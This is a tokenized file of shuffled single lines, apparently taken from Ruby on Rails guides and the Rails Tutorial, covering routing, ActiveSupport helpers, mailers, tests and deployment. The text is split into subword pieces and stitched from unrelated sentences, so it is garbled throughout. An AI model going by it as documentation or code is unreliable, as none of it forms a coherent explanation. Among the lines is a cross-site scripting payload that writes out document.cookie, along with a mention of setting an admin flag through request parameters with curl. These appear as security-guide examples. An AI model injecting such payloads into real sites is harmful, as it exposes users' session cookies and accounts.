▁TIP : ▁The ▁`: foreign _ key ` ▁and ▁`: association _ foreign _ key ` ▁options ▁are ▁useful ▁when ▁setting ▁up ▁a ▁many - to - many ▁self - join ▖
▁For ▁options , ▁please ▁see ▁the ▁ parent ▁section , ▁[ C al c ul ation s ](# calculations ) .
▁As ▁a ▁Rails ▁application ▁developer , ▁the ▁RESTful ▁style ▁of ▁development ▁help s ▁you ▁make ▁choice s ▁about ▁which ▁controllers ▁and ▁actions ▁to ▁write : ▁you ▁simply ▁structure ▁the ▁application ▁using ▁resources ▁that ▁get ▁created , ▁read , ▁updated , ▁and ▁delete d .
▁That ▁ video ▁and ▁its ▁ success or s ▁are ▁a ▁great ▁way ▁to ▁get ▁a ▁taste ▁of ▁Rails ' ▁power , ▁and ▁I ▁recommend ▁ watch ing ▁them .
▁ s ting }╼╼\ subsection { Image ▁upload ▁in ▁production } ▁% ▁( fold )╼\ label { sec : image _ upload _ in _ production }╼╼
▁" M :: X "▖ constantize ▁# ▁=> ▁1
▁As ▁in ▁previous ▁chapter s , ▁we ' ll ▁do ▁our ▁work ▁on ▁a ▁topic ▁branch ▁and ▁merge ▁in ▁the ▁changes ▁at ▁the ▁end :
▁This ▁code ▁is ▁high ly ▁prefer able :
▁NOTE : ▁` ActionDispatch :: Middleware Stack ` ▁is ▁Rails ▁equivalent ▁of ▁` Rack :: Builder `, ▁but ▁built ▁for ▁better ▁flexibility ▁and ▁more ▁features ▁to ▁me e t ▁Rails ' ▁requirements .
▁<% ▁@ article ▖ errors ▖ full _ messages ▖ each ▁do ▁| msg | ▁%>
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / compact ▖ rb ` .
▁date _ field (" user ", ▁" d ob ")
▁end
▁T hanks ▁for ▁join ing ▁and ▁have ▁a ▁great ▁day !
▁@ x , ▁@ y ▁= ▁x , ▁ y
▁| public / | The ▁only ▁folder ▁seen ▁by ▁the ▁world ▁as - is ▖
▁Before ▁the ▁ interceptor ▁can ▁do ▁its ▁job ▁you ▁need ▁to ▁ register ▁it ▁with ▁the ▁Action ╼ Mailer ▁framework ▖
▁" invoice _ lines "▖ classify ▁# ▁=> ▁" Invoice L in e "
▁( S ince ▁systems ▁will ▁var y , ▁and ▁since ▁keep ing ▁ track ▁of ▁how ▁many ▁tests ▁there ▁are ▁at ▁each ▁stage ▁of ▁the ▁tutorial ▁is ▁a ▁ maintenance ▁ n ight ma re , ▁I ' ll ▁omit ▁the ▁RSpec ▁output ▁from ▁now ▁on ▖)
▁#### ▁Using ▁Inde x ▁File s
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/}{/}) ▁with ▁a ▁new ▁micropost ▁form ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ with _ form _ bootstrap - full ▖ png }{( full ▁size )}
▁With ▁the ▁complet ion ▁of ▁the ▁Microposts ▁resource , ▁now ▁is ▁a ▁good ▁time ▁to ▁push ▁the ▁repository ▁up ▁to ▁GitHub :
▁It ▁has ▁a ▁`: remote ` ▁option ▁that ▁you ▁can ▁use ▁like ╼ this :
▁Like ▁with ▁any ▁blog , ▁our ▁readers ▁will ▁create ▁their ▁comments ▁directly ▁after ╼ read ing ▁the ▁article , ▁and ▁once ▁they ▁have ▁added ▁their ▁comment , ▁will ▁be ▁sent ▁back ╼ to ▁the ▁article ▁show ▁page ▁to ▁see ▁their ▁comment ▁now ▁list ed ▖
▁resources ▁: photos , ▁: account s
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" A " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁NOTE : ▁Use ▁` photos _ path `, ▁` new _ photo _ path `, ▁etc ▖ ▁to ▁generate ▁paths ▁for ▁this ▁resource .
▁<%= ▁link _ to ▁' Edit ▁A d ', ▁ [: edit , ▁@ magazine , ▁@ ad ] ▁%>
▁In ▁particular , ▁if ▁you ▁are ▁un familiar ▁with ▁\ emph { classes } ▁( d is c us s ed ▁in ▁Section ~\ ref { sec : ruby _ classes }), ▁I ▁suggest ▁ lo o p ing ▁back ▁to ▁this ▁section ▁at ▁a ▁later ▁time .
▁+ - --- +-------------+ - - -------- + --- --- + --------------- +
▁If ▁you ▁want ▁to ▁remove ▁session ▁related ▁middleware , ▁do ▁the ▁following :
▁by ▁itself .
▁If ▁you ▁learn ▁" The ▁Rails ▁Way " ▁you ' ll ▁ probably ▁ discover ▁a ╼ tr em end ous ▁increase ▁in ▁ product i v ity ▖
▁# ▁=> ▁< input ▁type =" url " ▁id =" user _ url " ▁name =" user [ url ] " ▁value ="# {@ user ▖ url } " ▁/>
▁12345678▖ to _ s (: delimited , ▁ delimiter : ▁ "▖" )
▁" name "▖ dasherize ▁# ▁=> ▁" name "
▁All ▁this ▁t al k ▁about ▁classes ▁and ▁inheritance ▁may ▁have ▁trigger ed ▁a ▁flash ▁of ▁re co g n it ion , ▁because ▁we ▁have ▁seen ▁both ▁before , ▁in ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : adding _ the _ about _ page }) :
▁" To m ▁& ▁ J er ry "▖ to _ param ▁# ▁=> ▁" To m ▁& ▁ J er ry "
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁first ▁application
▁Rails ▁supports ▁multiple ▁template ▁systems ▁and ▁uses ▁a ▁file ▁extension ▁to ▁distinguish ▁a mong st ▁them ▖
▁By ▁default ▁the ▁root ▁ n ode ▁is ▁" hash ", ▁but ▁that ' s ▁config ur able ▁via ▁the ▁`: root ` ▁option .
▁Note ▁that ▁the ▁final ▁step ▁is ▁necessary ▁to ▁write ▁the ▁changes ▁to ▁the ▁database .
▁E li m in ation ▁of ▁many ▁external ▁ dependencies ▁( RSpec , ▁Cucumber , ▁Capybara , ▁ Factory ▁Girl )
▁To ▁follow ▁a ▁user , ▁we ▁post ▁to ▁the ▁relationships ▁path ▁and ▁verify ▁that ▁the ▁number ▁of ▁followed ▁users ▁increase s ▁by ~ 1 :
▁And ▁the ▁ groups ▁that ▁have ▁them ▁are ▁always ▁the ▁last ▁one s .
▁In ▁earlier ▁versions , ▁a ▁` Hash With I ndifferentAccess ` ▁was ▁used ▖
▁A ▁form ▁for ▁un following ▁a ▁user .
▁ Default ▁is ▁false .
▁A lthough ▁we ▁don ' t ▁yet ▁know ▁how ▁to ▁implement ▁it , ▁we ▁can ▁already ▁write ▁tests ▁for ▁its ▁functionality .
▁As ▁a ▁cap st one ▁to ▁our ▁work ▁on ▁the ▁layout ▁and ▁routing , ▁in ▁this ▁section ▁we ' ll ▁make ▁a ▁route ▁for ▁the ▁signup ▁page , ▁which ▁will ▁mean ▁creating ▁a ▁second ▁controller ▁along ▁the ▁way .
▁The ╼ following ▁point ers ▁may ▁be ▁helpful :
▁The ▁way ▁to ▁set ▁such ▁an ▁attribute ▁to ▁\ k ode { true } ▁is ▁to ▁pass ▁the ▁value ▁\ k ode { admin =' 1 ' } ▁as ▁part ▁of ▁\ k ode { params [: user ]} , ▁a ▁task ▁that ▁is ▁easy ▁to ▁accomplish ▁using ▁a ▁command - line ▁HTTP ▁client ▁such ▁as ▁\ text tt { curl } .
▁#### ▁Scopes ▁for ▁` belongs _ to `
▁< small > B y ▁<%= ▁article ▖ author ▁%></ small >
▁Call ing ▁` content _ for ` ▁store s ▁a ▁block ▁of ▁markup ▁in ▁an ▁identifie r ▁for ▁later ▁use ▖
▁We ' ll ▁then ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁( app r o p ri ate ly ▁enough ) ▁\ k ode { first \_ app } .
▁Now ▁it ╼ is ▁merge d ▁like ▁any ▁other ▁scope .
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5 ▁O F F SE T ▁30
▁* ▁` update _ attribute `
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁> > ▁Rails ▖ env ▖ development ?
▁The ▁result ing ▁ backtrace ▁is ▁often ▁in con ve n i ent ly ▁long , ▁es pecially ▁since ▁the ▁source ▁of ▁the ▁problem ▁is ▁usually ▁the ▁application ▁and ▁not ▁one ▁of ▁its ▁ dependencies .
▁config ▖ action _ mailer ▖ perform _ deliveries ▁= ▁true
▁* ▁` config ▖ color ize _ logging ` ▁specifie s ▁whether ▁or ▁not ▁to ▁use ▁A N S I ▁ color ▁code s ▁when ▁logging ▁information ▖
▁We ▁saw ▁in ▁Section ~\ ref { sec : database _ migrations } ▁that ▁ generating ▁the ▁User ▁model ▁automatically ▁created ▁a ▁new ▁migration ▁( Listing ~\ ref { code : users _ migration }) ; ▁in ▁the ▁present ▁case , ▁we ▁are ▁adding ▁structure ▁to ▁an ▁existing ▁model , ▁so ▁we ▁need ▁to ▁create ▁a ▁migration ▁directly ▁using ▁the ▁\ k ode { migration } ▁generator :
▁Here ' s ▁the ▁re v is ed ▁code ▁for ▁setting ▁up ▁ customers ▁and ▁orders :
▁This ▁requires ▁a ▁\ k ode { before \_ create } ▁callback , ▁which ▁we ' ll ▁define ▁as ▁follows :
▁If ▁you ▁require ▁this ▁sort ▁of ▁complex ▁behavior ▁on ▁the ▁table ▁that ▁ joins ▁two ▁models ▁in ▁a ▁many - to - many ▁relationship , ▁you ▁should ▁use ▁a ▁` has _ many ▁: through ` ▁association ▁instead ▁of ▁` has _ and _ belongs _ to _ many ` .
▁module ▁X
▁[ S te ve ▁So u d ers ▁recommend s ]( http :// www ▖ s te ve so u d ers ▖ com / blog / 2008 / 08 / 23 / re v v ing - filename s - do nt - use - query string / ) ,╼ ▁" ▖▖▖ a v o id ing ▁a ▁query string ▁for ▁cache able ▁resources "▖
▁The ▁new ▁article ▁form ]( images / getting _ started / new _ article ▖ png )
▁In ▁order ▁to ▁see ▁these ▁changes , ▁our ▁test ▁needs ▁to ▁log ▁in ▁as ▁a ▁previous ly ▁registered ▁user , ▁which ▁means ▁that ▁such ▁a ▁user ▁must ▁already ▁exist ▁in ▁the ▁database .
▁ Show ing ▁the ▁users ▁the ▁given ▁user ▁is ▁following .
▁as ▁show n ▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test } .
▁" hello "▖ to (2) ▁# ▁=> ▁" h el "
▁ foo @ bar _ baz ▖ com ▁ foo @ bar + baz ▖ com ]
▁For ▁example , ▁if ▁you ' re ▁getting ▁a ▁set ▁of ▁records ▁and ▁want ▁to ▁order ▁them ▁in ▁as c end ing ▁order ▁by ▁the ▁` created _ at ` ▁field ▁in ▁your ▁table :
▁* ▁`: destroy ` ▁cause s ▁the ▁ associated ▁object ▁to ▁also ▁be ▁destroyed
▁* ▁Otherwise , ▁a ▁ n ode ▁with ▁` key ` ▁as ▁tag ▁is ▁created ▁with ▁a ▁string ▁representation ▁of ▁` value ` ▁as ▁text ▁ n ode ▖
▁ Only ▁the ▁gem ' s ▁admin ▁layout ▁needs ╼ the se ▁assets ▖
▁t ▖ string ▁: name
▁Ju st ▁like ▁with ▁controller ▁views , ▁use ▁` yield ` ▁to ▁render ▁the ▁view ▁inside ▁the ╼ layout .
▁Defin ing ▁the ▁\ k ode { current \_ user } ▁helper ▁as ▁discuss ed ▁above ▁lead s ▁to ▁the ▁implementation ▁show n ▁in ▁Listing ~\ ref { code : persistent _ current _ user } .
▁\ href { http :// guides ▖ rubyonrails ▖ org /}{ Rails ▁Guides } : ▁To p ical ▁and ▁up - to - date ▁Rails ▁ references
▁The ▁configuration ▁file ▁for ▁the ▁production ▁ webserver .
▁* ▁` action _ mailer ▖ logger ` ▁Set s ▁` ActionMailer :: Base ▖ logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails ▖ logger ` .
▁* ▁` ActiveRecord :: Query Cache ` ▁cache s ▁all ▁ SELECT ▁queries ▁generated ▁in ▁a ▁request ▖
▁Associations ▁are ▁ extremely ▁useful , ▁but ▁they ▁are ▁not ▁magic ▖
▁Because ▁the ▁`` Log ▁out '' ▁link ▁has ▁already ▁been ▁defined ▁( Listing ~\ ref { code : layout _ login _ logout _ links }), ▁all ▁we ▁need ▁is ▁to ▁write ▁a ▁valid ▁controller ▁action ▁to ▁destroy ▁user ▁sessions .
▁Whi le ▁you ' re ▁wait ing ▁for ▁feedback ▁on ▁your ▁pull ▁request , ▁open ▁up ▁a ▁few ▁other ╼ pull ▁requests ▁and ▁give ▁some one ▁else ▁some !
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁nil } ▖ compact ▁# ▁=> ▁ { a : ▁1, ▁b : ▁2 }
▁G u ide ▁As sum p tion s
▁# ▁validates ▁: name , ▁presence : ▁true
▁<%= ▁stylesheet _ link _ tag ▁" layout " ▁%>
▁* ▁` config ▖ session _ store ` ▁is ▁usually ▁set ▁up ▁in ▁` config / initializers / session _ store ▖ rb ` ▁and ▁specifie s ▁what ▁class ▁to ▁use ▁to ▁store ▁the ▁session ▖
▁* ▁B i - d i re ctional ▁associations
▁The ▁generation ▁of ▁the ▁reader ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ reader ` ▁to ▁` false ` ▁and ▁the ▁generation ▁of ▁the ▁ writer ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ writer ` ▁to ▁` false ` ▖
▁U pgrading ▁from ▁Rails ▁ 3▖0 ▁to ▁Rails ▁3▖1
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁second s ▁0 ▁through ▁ 59 ▁with ▁the ▁current ▁second ▁select ed .
▁* ▁`: source `
▁You ▁can ▁learn ▁more ▁about ▁callbacks ▁in ╼ the ▁[ Active ▁Record ▁ Callbacks ▁guide ]( active _ record _ callback s ▖ html ) .
▁I ' m ▁learning ▁Ruby ▁on ▁Rails ▁with ▁@ railstutorial !
▁The ▁RESTful ▁structure ▁of ▁Rails ▁applications ▁is ▁best ▁ abs o rb ed ▁by ▁this ▁sort ▁of ▁repetition ▁of ▁form ; ▁in de ed , ▁see ing ▁the ▁parallel ▁structure ▁of ▁Users ▁and ▁Microposts ▁even ▁at ▁this ▁ early ▁stage ▁is ▁one ▁of ▁the ▁p ri me ▁ motivation s ▁for ▁this ▁chapter .
▁Because ▁of ▁this ▁behavior ▁you ▁cannot ▁use ▁any ▁of ▁the ▁` * _ path ` ▁helpers ▁inside ▁of ╼ an ▁email ▖
▁Oh ▁ de a ▖▖▖"
▁The ▁` comment _ counter ` ▁local ▁variable ▁is ▁given ▁to ▁us ▁by ▁the ▁` <%= ▁render ╼ @ article ▖ comments ▁%> ` ▁call , ▁which ▁will ▁define ▁it ▁automatically ▁and ▁ increment ▁the ╼ counter ▁as ▁it ▁iterate s ▁through ▁each ▁comment ▖
▁* ▁` geocoder _ path ` ▁returns ▁` / geocoder `
▁password : ▁' < password > ',
▁ 12345 ▖ to _ s (: human ) ▁# ▁=> ▁" 12 ▖ 3 ▁T housand "
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : successful _ edit _ test }
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb
▁1234567890 123 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁T r illion "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / attr _ internal ▖ rb ` .
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁defaults : ▁ { ▁format : ▁' jpg ' ▁ }
▁#### ▁` in _ groups _ of ( number , ▁fill _ with ▁= ▁nil ) `
▁ Adding ▁the ▁URL ▁to ▁the ▁users ▁link .
▁We ▁then ▁make ▁50 ▁microposts ▁for ▁each ▁user ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁ limit ▁of ~ 30 ), ▁ generating ▁sample ▁content ▁for ▁each ▁micropost ▁using ▁the ▁ Faker ▁gem ' s ▁hand y ▁\ href { http :// fa k er ▖ ruby for ge ▖ org / rdoc / classes / Faker / Lorem ▖ html }{\ text tt { Lorem ▖ sentence } ▁method } .
▁This ▁means ▁there ▁is ▁no ▁way ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # HTTP _ session _ state } { with in ▁the ▁h y p er text ▁ tr an s f er ▁protocol } ▁to ▁remember ▁a ▁user ' s ▁id entity ▁from ▁page ▁to ▁page ; ▁instead , ▁web ▁applications ▁ requiring ▁user ▁login ▁must ▁use ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ ( computer _ science ) }{\ emph { session } }, ▁which ▁is ▁a ▁ s em i - permanent ▁connection ▁between ▁two ▁computer s ▁( such ▁as ▁a ▁client ▁computer ▁running ▁a ▁web ▁browser ▁and ▁a ▁server ▁running ▁Rails ) .
▁$ ▁bundle ▁exec ▁rake ▁test
▁The ▁results ▁are ▁show n ▁in ▁Figure ~\ ref { fig : demo _ micropost _ model } .
▁This ▁make s ▁it ▁easier ▁to ▁back port ▁changes ▁to ▁ s table ╼ branch es , ▁ squash ing ▁make s ▁it ▁easier ▁to ▁ r ever t ▁ bad ▁commit s , ▁and ▁the ▁git ▁ history ╼ can ▁be ▁a ▁bit ▁easier ▁to ▁follow ▖
▁For ▁example , ▁to ▁test ▁ unsuccessful ▁signin , ▁we ▁could ▁write ▁the ▁following ▁scenario :
▁When ▁you ▁type ▁` http :// localhost : 3 000 ` ▁into ▁your ▁browser ' s ▁address ▁bar ▁and ▁hit ╼ ' Go , ' ▁the ▁browser ▁( your ▁' client ') ▁make s ▁a ▁request ▁to ▁the ▁server ▖
▁in ▁Listing ~\ ref { code : feed _ item _ partial } .
▁def ▁ welcome _ email ( user )
▁Listing ~\ ref { code : user _ login _ test _ valid _ information } ▁also ▁verifie s ▁that ▁the ▁login ▁link ▁disappear s ▁by ▁verify ing ▁that ▁there ▁are ▁\ emph { zero } ▁login ▁path ▁links ▁on ▁the ▁page :
▁The ▁method ▁` pluralize ` ▁returns ▁the ▁plural ▁of ▁its ▁receiver :
▁A ▁mockup ▁of ▁the ▁result ▁of ▁visit ing ▁a ▁ protected ▁page ~\ href { http :// railstutorial ▖ org / images / figures / signin _ page _ protected _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁class ▁Compute r ▁< ▁ActiveRecord :: Base
▁resources ▁: account s
▁duplicate ▖ push ▁' another - string '
▁Consider ▁the ▁following ▁simple ▁Active ▁Record ▁class :
▁Re ce i v ing ▁and ▁pa rs ing ▁email s ▁with ▁Action ▁Mailer ▁can ▁be ▁a ▁rather ▁complex ╼ end ea v or ▖
▁scope ▁' admin ', ▁as : ▁' admin ' ▁do
▁You ▁can ▁specify ▁certain ▁conditions ▁to ▁be ▁removed ▁using ▁the ▁` unscope ` ▁method ▖
▁config ▖ assets ▖ version ▁= ▁' 1 ▖ 0 '
▁We ▁can ▁test ▁this ▁with ▁the ▁\ k ode { it } ▁and ▁\ k ode { it s } ▁methods ▁as ▁follows :
▁=> ▁ Word
▁But ▁a ▁ craft s man ▁has ▁to ▁know ▁his ▁tool s , ▁and ▁in ▁the ▁end ▁the ▁re ward ▁is ▁worth ▁the ▁effort .
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁ demo ▁application .
▁ 1235551234 ▖ to _ s (: phone )
▁We ' ll ▁follow ▁the ▁examples ▁from ▁Listing ~\ ref { code : static _ page _ routes } ▁and ▁add ▁a ▁\ k ode { get ▁' / signup ' } ▁rule ▁for ▁the ▁signup ▁URL , ▁as ▁show n ▁in ▁Listing ~\ ref { code : signup _ route } .
▁However , ▁public ▁API ▁follows ▁a ▁slightly ▁different ▁convention ▖
▁#### ▁Rendering ▁Text
▁You ▁can ▁also ▁use ▁an ▁argument ▁to ▁the ▁\ k ode { heroku } ▁command ▁that ▁automatically ▁open s ▁your ▁browser ▁with ▁the ▁right ▁address :
▁If ▁you ▁open ╼` app / controllers / articles _ controller ▖ rb ` ▁again , ▁you ' ll ▁notice ▁that ▁we ▁don ' t ╼ check ▁the ▁result ▁of ▁calling ▁`@ article ▖ save ` ▁inside ▁the ▁` create ` ▁action ▖╼
▁It ▁is ▁broken ▁in ▁small ▁pieces ▁so ▁that ▁you ▁can ▁load ▁just ▁what ▁you ▁need , ▁and ▁also ▁has ▁some ▁convenience ▁entry ▁point s ▁to ▁load ▁related ▁extensions ▁in ▁one ▁ sh o t , ▁even ▁everything .
▁the ▁output ▁includes ▁the ▁following ▁complain t :
▁A ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { name } ▁attribute ▖
▁Now ▁that ▁we ' ve ▁complete d ▁a ▁quick ▁ overview ▁of ▁the ▁Users ▁resource , ▁let ' s ▁examine ▁one ▁particular ▁part ▁of ▁it ▁in ▁the ▁context ▁of ▁the ▁Model - View - Controller ▁( MVC ) ▁pattern ▁introduce d ▁in ▁Section ~\ ref { sec : mvc } .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁User ▁and ▁Micropost ▁models .
▁Support ▁for ▁the ▁` en code _ json ` ▁ hook
▁In ▁principle , ▁these ▁two ▁task s ▁can ▁be ▁combine d ▁in ▁\ k ode { rake ▁db : reset }, ▁but ▁as ▁of ▁this ▁writing ▁this ▁command ▁doesn ' t ▁work ▁with ▁the ▁latest ▁version ▁of ▁Rails .
▁@ article ▁= ▁Article ▖ new
▁The ▁tests ▁for ▁the ▁\ k ode { update } ▁action ▁are ▁similar ▁to ▁those ▁for ▁\ k ode { create } .
▁Because ▁they ▁make ▁common ▁operations ▁simple r ▁and ▁easier ▁in ▁your ▁code ▖
▁te }╼╼ ▁\ subsection { Heroku ▁commands } ╼ ▁\ label { sec : heroku _ commands }╼╼
▁only ▁\ emph { one } ▁of ▁the ▁lines ▁get s ▁executed ▁( base d ▁on ▁the ▁nature ▁of ▁the ▁request ) .
▁Note ▁the ▁use ▁of ▁\ k ode { if ▁@ user ▖ microposts ▖ any ?}\ ▁( a ▁construction ▁we ▁saw ▁before ▁in ▁Listing ~\ ref { code : errors _ partial }), ▁which ▁make s ▁sure ▁that ▁an ▁empty ▁list ▁won ' t ▁be ▁displayed ▁when ▁the ▁user ▁has ▁no ▁microposts .
▁Rails ▁will ▁automatically ▁render ▁` app / views / books / index ▖ html ▖ erb ` ▁when ▁you ▁navigate ▁to ▁` / books ` ▁and ▁you ▁will ▁see ▁" Book s ▁are ▁ com ing ▁soon !" ▁on ▁your ▁ screen .
▁match ▁end ▁of ▁a ▁string
▁The ▁results ▁of ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page } ▁are ▁show n ▁in ▁Figure ~\ ref { fig : custom _ home _ page } ▁and ▁Figure ~\ ref { fig : custom _ help _ page } .
▁L oo p ing ▁through ▁the ▁flash ╼ will ▁always ▁yield ▁string ▁keys :
▁render ▁' edit '
▁Section ~\ ref { sec : activation _ email _ in _ production } ▁discuss es ▁how ▁to ▁send ▁email ▁for ▁real ▁in ▁a ▁production ▁environment .
▁> > ▁p ▖ valid ?
▁javascript _ url ▁" common " ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / common ▖ js
▁# ▁< id ▁type =" integer "> 44 04 </ id >
▁If ▁you ▁want ▁to ▁serve ▁only ▁some ▁assets ▁from ▁your ▁CDN , ▁you ▁can ▁use ▁custom ▁`: host `╼ option ▁your ▁asset ▁helper , ▁which ▁overwrit es ▁value ▁set ▁in ╼` config ▖ action _ controller ▖ asset _ host ` .
▁def ▁ prepare
▁t ▖ string ▁: order _ number
▁( I ▁find ▁it ▁confusing ▁that ▁the ▁console , ▁server , ▁and ▁ migrate ▁commands ▁specify ▁non - default ▁ environments ▁in ▁three ▁m u t u ally ▁in com p at ible ▁ways , ▁which ▁is ▁why ▁I ▁both er ed ▁ showing ▁all ▁three ▖)
▁These ▁do t s ▁represent ▁omitted ▁code ▁and ▁should ▁not ▁be ▁copie d ▁literal ly .
▁( The ▁indentation ▁is ▁optional --- HTML ▁is ▁not ▁ sensitive ▁to ▁whitespace , ▁and ▁ignore s ▁both ▁ tab s ▁and ▁spaces --- but ▁it ▁make s ▁the ▁document ' s ▁structure ▁easier ▁to ▁see ▖)
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ callback s ▖ html } { d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁Guides } .
▁<%= ▁image _ tag ▁" icon s / delete ▖ g if " ▁%>
▁We ▁can ▁ visual ize ▁the ▁result ▁of ▁this ▁association ▁in ▁Figure ~\ ref { fig : micropost _ user _ association } .
▁ mod ▖ const _ set ( const _ name , ▁value )
▁N ▁= ▁ Module ▖ new
▁Creat ing ▁a ▁new ▁ workspace ▁at ▁ Cloud 9 .
▁T h r ough ▁these ▁examples , ▁you ▁will ▁see ▁how ▁Rails ▁can ▁handle ▁even ▁rather ▁in tr ic ate ▁data ▁models , ▁which ▁should ▁serve ▁you ▁well ▁as ▁you ▁go ▁on ▁to ▁develop ▁your ▁own ▁applications ▁with ▁their ▁own ▁specific ▁requirements .
▁record ▖ errors [: name ] ▁<< ▁' N e ed ▁a ▁name ▁starting ▁with ▁X ▁please ! '
▁Basic ▁HTTP ▁ Authentication ▁C hallenge ]( images / getting _ started / c hallenge ▖ png )
▁By ▁assign ing ▁a ▁message ▁to ▁the ▁\ k ode { flash }, ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁display ▁the ▁message ▁on ▁the ▁first ▁page ▁after ▁the ▁redirect .
▁### ▁` try `
▁" visual E ffect "▖ underscore ▁# ▁=> ▁" visual _ e ffect "
▁say s ▁that ▁we ▁are ▁missing ▁a ▁`` template '' , ▁i ▖ e ▖ , ▁a ▁view :
▁t ▖ belongs _ to ▁: customer
▁P lease ▁remember ▁to ▁use ▁it ▁for ▁commit s ▁containing ▁only ▁documentation ▁changes .
▁### ▁ W ar n ing s
▁< script > document ▖ write ( document ▖ cookie ) ; </ script >
▁( We ' ll ▁create ▁the ▁\ k ode { shared } ▁directory ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▖)
▁Now ▁the ▁tests ▁should ▁be ▁\ passing :
▁| ▁` LineItem ` ▁| ▁` line _ items ` ▁|
▁Git ▁is ▁a ▁large ▁subject , ▁and ▁we ' ll ▁only ▁be ▁scratch ing ▁the ▁ s ur fa ce ▁in ▁this ▁book , ▁but ▁there ▁are ▁many ▁good ▁free ▁resources ▁online ; ▁I ▁es pecially ▁recommend ▁\ href { http :// git - s cm ▖ com / book }{\ emph { Pro ▁Git } } ▁by ▁S co tt ▁C ha con ▁( A press , ▁200 9 ) .
▁in ▁Listing ~\ ref { code : layout _ links _ test _ signup _ full _ title _ helper } .
▁We ▁can ▁use ▁the ▁above ▁method ▁to ▁construct ▁the ▁necessary ▁array ▁of ▁followed ▁user ▁id s ▁by ▁calling ~\ k ode { id } ▁on ▁each ▁element ▁in ▁\ k ode { user ▖ following } .
▁This ▁means ▁that ▁if ▁you ▁have ▁an ▁asset ▁called ▁` style ▖ css `, ▁it ▁should ▁be ▁placed ▁at ╼` app / assets / stylesheets / [ engine ▁name ] / style ▖ css `, ▁rather ▁than ╼` app / assets / stylesheets / style ▖ css ` ▖
▁Additional ly , ▁all ▁the ▁HTML ▁in ▁this ▁section ▁should ▁render ▁properly , ▁ showing ▁the ▁form ▁as ▁in ▁Figure ~\ ref { fig : home _ with _ form }, ▁and ▁a ▁form ▁with ▁a ▁submission ▁error ▁as ▁in ▁Figure ~\ ref { fig : home _ form _ errors } .
▁The ▁Home ▁page ▁with ▁an ▁added ▁ footer .
▁If ▁you ▁did n ' t ▁do ▁that ▁exercise , ▁update ▁your ▁Users ▁helper ▁file ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁before ▁proceeding .
▁In ╼ an tic ip ation ▁of ▁this ▁change , ▁Rails ▁4 ▖ 2 ▁introduce d ▁a ▁new ▁configuration ▁option ╼` active _ support ▖ test _ order ` ▁for ▁explicitly ▁specify ing ▁the ▁test ▁ ordering ▖
▁One ▁way ▁to ▁use ▁partials ▁is ▁to ▁treat ▁them ▁as ▁the ▁equivalent ▁of ▁sub r out in es : ▁as ▁a ▁way ▁to ▁move ▁details ▁out ▁of ▁a ▁view ▁so ▁that ▁you ▁can ▁gra s p ▁what ' s ▁going ▁on ▁more ▁easily ▖
▁# ▁Return s ▁the ▁current ▁logged - in ▁user ▁( if ▁any ) .
▁The ▁following ▁is ▁a ▁technical ▁ explanation ▁of ▁the ▁worm .
▁Setting ▁the ▁test ▁domain ▁host .
▁<%= ▁link _ to ▁' A d ▁details ', ▁[ @ magazine , ▁@ ad ] ▁%>
▁It ▁can ▁also ▁generate ▁paths ▁and ▁URLs , ▁avoid ing ▁the ▁need ▁to ▁hard code ▁strings ▁in ▁your ▁views .
▁If ▁you ▁f r equ ent ly ▁retrieve ▁line ▁ items ▁directly ▁from ▁ customers ▁( `@ customer ▖ orders ▖ line _ items ` ), ▁then ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁line ▁ items ▁in ▁the ▁association ▁from ▁ customers ▁to ▁orders :
▁The ▁result ing ▁correspond ence ▁of ▁URLs , ▁actions , ▁and ▁named ▁routes ▁is ▁show n ▁in ▁Table ~\ ref { table : RESTful _ users } .
▁unless ▁@ number ▖ nil ?
▁\ k ode { app / assets } : ▁assets ▁specific ▁to ▁the ▁present ▁application
▁Because ▁of ▁the ▁in n um er able ▁small ▁difference s ▁between ▁different ▁computer ▁systems , ▁the ▁output ▁you ▁see ▁may ▁not ▁always ▁a g re e ▁exactly ▁with ▁what ▁is ▁show n ▁in ▁the ▁text ,╼ but ▁this ▁is ▁not ▁cause ▁for ▁concern .
▁@ book ▁= ▁ Book ▖ find _ by ( id : ▁params [: id ])
